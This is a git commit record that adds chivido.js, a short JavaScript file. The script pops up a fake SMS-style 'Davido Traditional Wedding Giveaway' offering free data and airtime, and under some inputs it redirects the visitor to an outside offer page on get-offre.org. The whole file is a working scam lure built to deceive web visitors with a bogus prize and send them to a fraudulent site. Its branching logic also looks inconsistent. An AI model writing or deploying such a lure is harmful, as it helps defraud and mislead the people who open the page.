f6c45caaf44cf618d5a553ca6e7c7d60ba382e51
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-06-23 14:24:18 -0700

    Create chivido.js

---
+++ chivido.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: Davido Traditional Wedding Giveaway, you will receive 10GB + ₦5,000 Airtime Voucher, Kindly press 1 to get yours now ','1');
+if (password != '1') {
+location.href='https://get-offre.org/chivido2024.html';
+}
